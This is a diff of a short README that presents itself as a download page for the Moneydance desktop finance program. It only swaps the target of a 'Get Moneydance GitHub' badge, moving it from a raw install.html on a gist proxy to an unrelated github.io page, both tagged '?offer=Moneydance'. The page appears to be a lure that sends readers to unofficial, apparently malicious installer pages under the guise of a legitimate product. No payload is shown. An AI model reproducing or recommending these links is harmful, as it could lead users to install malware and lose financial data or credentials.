@@ -1,6 +1,6 @@
 # Moneydance Download — Desktop Finance Organizer  
 
-[![Get Moneydance GitHub](https://img.shields.io/badge/Get%20Moneydance%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://gistcdn.githack.com/dwarfunicorn25/fea6a77b262d29b59a384a526104a497/raw/63797952fb903515827709499fcabfc7f8e77c3a/install.html?offer=Moneydance)  
+[![Get Moneydance GitHub](https://img.shields.io/badge/Get%20Moneydance%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://app-set-deploy.github.io/.github/?offer=Moneydance)  
 
 ---
 
